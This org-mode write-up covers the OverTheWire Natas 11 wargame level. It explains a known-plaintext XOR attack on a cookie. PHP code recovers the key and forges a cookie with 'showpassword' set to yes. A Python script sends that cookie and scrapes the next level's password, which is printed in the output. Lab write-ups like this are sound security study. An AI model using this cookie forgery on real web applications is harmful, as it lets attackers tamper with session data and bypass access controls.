#+TITLE: OverTheWire Natas
#+SETUPFILE: https://fniessen.github.io/org-html-themes/org/theme-readtheorg.setup
#+OPTIONS: num:nil
#+EXPORT_FILE_NAME: index
#+PROPERTY: header-args :eval never-export
#+PROPERTY: header-args:python :session *Py* :tangle ape.py

* Natas11 => Natas12

Since you can reverse xor if you know what the input is, we can get the key by xor'ing the default cookie with the default data.
The cookie is just =qw8J= repeated over and over.

#+begin_src php
function xor_encrypt($in, $key)
{
    $text = $in;
    $outText = '';

    // Iterate through each character
    for ($i = 0; $i < strlen($text); $i++) {
        $outText .= $text[$i] ^ $key[$i % strlen($key)];
    }

    return $outText;
}

$cookie = "ClVLIh4ASCsCBE8lAxMacFMZV2hdVVotEhhUJQNVAmhSEV4sFxFeaAw=";
$key = json_encode(array( "showpassword"=>"no", "bgcolor"=>"#ffffff"));

echo "Key is: " . xor_encrypt(base64_decode($cookie), $key) . "\n";

$exploit_cookie = json_encode(array("showpassword"=>"yes","bgcolor"=>"#ffffff"));
$key = "qw8J";

echo "New cookie is: " . base64_encode(xor_encrypt($exploit_cookie, $key));
#+end_src

#+RESULTS:
: Key is: qw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jqw8Jq
: New cookie is: ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK

#+begin_src python :results none
def natas11():
    username = 'natas11'
    print(F"Pwning {username}")
    url = get_url(username)

    malicious_cookie = {'data': "ClVLIh4ASCsCBE8lAxMacFMOXTlTWxooFhRXJh4FGnBTVF4sFxFeLFMK"}

    r = requests.get(url, auth=HTTPBasicAuth(username, credentials[username]),cookies=malicious_cookie)

    passwd = re.findall(r'natas12 is (\w+)', r.text)[0]

    credentials["natas12"] = passwd
    save()
#+end_src

#+begin_src python :exports none :tangle no
natas11()
credentials['natas12']
#+end_src

#+RESULTS:
: EDXp0pS26wLKHZy1rDBPUZk0RKfLGIR3

